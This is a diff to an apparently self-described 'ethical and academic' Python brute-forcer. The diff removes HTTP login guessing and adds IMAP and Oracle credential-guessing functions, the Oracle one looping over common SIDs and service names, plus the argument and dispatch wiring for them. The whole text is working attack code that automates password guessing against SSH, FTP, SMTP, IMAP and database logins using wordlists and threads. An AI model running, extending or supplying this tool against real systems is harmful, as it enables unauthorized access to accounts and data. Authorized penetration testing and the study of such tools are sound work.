@@ -10,12 +10,12 @@ import time
 # Protocol-specific imports
 import paramiko        # SSH
 import ftplib          # FTP
-import requests        # HTTP/HTTPS
 import smtplib         # SMTP
 import pymysql         # MySQL
 import psycopg2        # PostgreSQL
 import pymssql         # MS SQL
-# import slixmpp      # XMPP (modern and maintained) - REMOVED
+import imaplib         # IMAP
+import oracledb        # Oracle (modern)
 import hashlib         # for hash check
 import zipfile         # ZIP bruteforce
 import pyzipper        # Use pyzipper for ZIP bruteforce (added)
@@ -120,22 +120,80 @@ def ftp_bruteforce(username, password, target_ip, debug=False):
             print_dbg(f"FTP fail: {username}:{password} -> {e}", debug)
         return False
 
-# HTTP/HTTPS
-def http_bruteforce(username, password, target_url, debug=False):
-    login_data = {'username': username, 'password': password}
+# IMAP (added)
+def imap_bruteforce(username, password, target_ip, port=143, use_ssl=False, debug=False):
     try:
-        r = requests.post(target_url, data=login_data, timeout=5)
-        if "login failed" not in r.text.lower():
+        if use_ssl:
+            M = imaplib.IMAP4_SSL(target_ip, port)
+        else:
+            M = imaplib.IMAP4(target_ip, port)
+        rv, data = M.login(username, password)
+        if rv == "OK":
+            M.logout()
             return True
         else:
-            print_dbg(f"HTTP fail: {username}:{password}", debug)
+            print_dbg(f"IMAP fail: {username}:{password} -> login failed", debug)
+            M.logout()
             return False
-    except requests.exceptions.ConnectionError as e:
-        print_error(f"HTTP connection refused or timed out for {target_url}", debug)
+    except imaplib.IMAP4.error as e:
+        print_dbg(f"IMAP fail: {username}:{password} -> {e}", debug)
         return False
     except Exception as e:
-        print_dbg(f"HTTP error: {e}", debug)
+        if is_connection_refused(e):
+            print_error(f"IMAP connection refused or timed out for {target_ip}:{port}", debug)
+        else:
+            print_dbg(f"IMAP fail: {username}:{password} -> {e}", debug)
         return False
+
+# Oracle (enhanced, using oracledb)
+def oracle_bruteforce(username, password, target_ip, port=1521, debug=False):
+    sids = ["ORCL", "XE", "ORACLE", "TEST"]
+    services = ["XE", "orcl", "oracle", "test"]
+    tried = []
+    for sid in sids:
+        try:
+            dsn = oracledb.makedsn(target_ip, port, sid=sid)
+            tried.append(f"SID:{sid}")
+            conn = oracledb.connect(user=username, password=password, dsn=dsn, timeout=5)
+            conn.close()
+            return True
+        except oracledb.DatabaseError as e:
+            err = str(e)
+            if "ORA-01017" in err or "invalid username/password" in err.lower():
+                print_dbg(f"Oracle fail: {username}:{password} -> invalid credentials (SID={sid})", debug)
+                continue
+            elif is_connection_refused(e) or "ORA-12541" in err or "could not resolve" in err.lower():
+                print_error(f"Oracle connection refused, timed out, or could not resolve for {target_ip}:{port} (SID={sid})", debug)
+                continue
+            else:
+                print_dbg(f"Oracle fail: {username}:{password} -> {e} (SID={sid})", debug)
+                continue
+        except Exception as e:
+            print_dbg(f"Oracle unexpected error (SID={sid}): {e}", debug)
+            continue
+    for service in services:
+        try:
+            dsn = oracledb.makedsn(target_ip, port, service_name=service)
+            tried.append(f"SERVICE:{service}")
+            conn = oracledb.connect(user=username, password=password, dsn=dsn, timeout=5)
+            conn.close()
+            return True
+        except oracledb.DatabaseError as e:
+            err = str(e)
+            if "ORA-01017" in err or "invalid username/password" in err.lower():
+                print_dbg(f"Oracle fail: {username}:{password} -> invalid credentials (SERVICE={service})", debug)
+                continue
+            elif is_connection_refused(e) or "ORA-12541" in err or "could not resolve" in err.lower():
+                print_error(f"Oracle connection refused, timed out, or could not resolve for {target_ip}:{port} (SERVICE={service})", debug)
+                continue
+            else:
+                print_dbg(f"Oracle fail: {username}:{password} -> {e} (SERVICE={service})", debug)
+                continue
+        except Exception as e:
+            print_dbg(f"Oracle unexpected error (SERVICE={service}): {e}", debug)
+            continue
+    print_dbg(f"Oracle tried: {', '.join(tried)}", debug)
+    return False
 
 # SMTP
 def smtp_bruteforce(username, password, smtp_server, port=25, use_ssl=False, debug=False):
@@ -357,14 +415,14 @@ def multi_worker(target_func, usernames, passwords, debug, result_flag):
 
 def main():
     parser = argparse.ArgumentParser(description="Advanced multi-protocol bruteforcer for ethical and academic use only.")
-    parser.add_argument("target", nargs="?", help="Target URL or IP with protocol prefix (e.g., ssh://1.2.3.4, ftp://1.2.3.4, http://example.com)")
+    parser.add_argument("target", nargs="?", help="Target URL or IP with protocol prefix (e.g., ssh://1.2.3.4, ftp://1.2.3.4, imap://mail.com, oracle://1.2.3.4)")
     parser.add_argument("-l", "--username", help="Single username to test")
     parser.add_argument("-L", "--userlist", help="File with multiple usernames")
     parser.add_argument("-P", "--passlist", required=True, help="Password list file")
     parser.add_argument("-t", "--threads", type=int, default=4, help="Number of concurrent threads (default 4)")
     parser.add_argument("--dbg", action="store_true", help="Enable debug verbose output")
     parser.add_argument("-p", "--port", type=int, help="Port number if applicable")
-    parser.add_argument("-S", "--ssl", action="store_true", help="Use SSL (only for SMTP, HTTP/HTTPS)")
+    parser.add_argument("-S", "--ssl", action="store_true", help="Use SSL (for SMTP or IMAP)")
     parser.add_argument("-f", "--file", help="File path (for zip/hash/pdf bruteforce)")
 
     args = parser.parse_args()
@@ -428,7 +486,7 @@ def main():
     target_ip = None
     target_port = args.port
 
-    if proto in ["ssh", "ftp", "smb", "irc", "oracle", "mssql", "postgres"]:
+    if proto in ["ssh", "ftp", "smb", "irc", "oracle", "mssql", "postgres", "imap"]:
         if ":" in target_rest:
             ip, port_str = target_rest.split(":", 1)
             target_ip = ip
@@ -451,8 +509,6 @@ def main():
         target_ip = target_rest
         if not target_port:
             target_port = 465 if args.ssl else 25
-    elif proto in ["http", "https"]:
-        target_ip = target_rest
     else:
         print(f"[-] Unsupported protocol: {proto}")
         sys.exit(1)
@@ -462,8 +518,6 @@ def main():
         target_func = lambda u, p: ssh_bruteforce(u, p, target_ip, debug=args.dbg)
     elif proto == "ftp":
         target_func = lambda u, p: ftp_bruteforce(u, p, target_ip, debug=args.dbg)
-    elif proto == "http" or proto == "https":
-        target_func = lambda u, p: http_bruteforce(u, p, target, debug=args.dbg)
     elif proto == "smtp":
         target_func = lambda u, p: smtp_bruteforce(u, p, target_ip, port=target_port, use_ssl=args.ssl, debug=args.dbg)
     elif proto == "mysql":
@@ -474,6 +528,10 @@ def main():
         target_func = lambda u, p: mssql_bruteforce(u, p, target_ip, port=target_port or 1433, debug=args.dbg)
     elif proto == "irc":
         target_func = lambda u, p: irc_bruteforce(u, p, target_ip, port=target_port or 6667, debug=args.dbg)
+    elif proto == "oracle":
+        target_func = lambda u, p: oracle_bruteforce(u, p, target_ip, port=target_port or 1521, debug=args.dbg)
+    elif proto == "imap":
+        target_func = lambda u, p: imap_bruteforce(u, p, target_ip, port=target_port or (993 if args.ssl else 143), use_ssl=args.ssl, debug=args.dbg)
     else:
         print(f"[-] Protocol {proto} not implemented.")
         sys.exit(1)
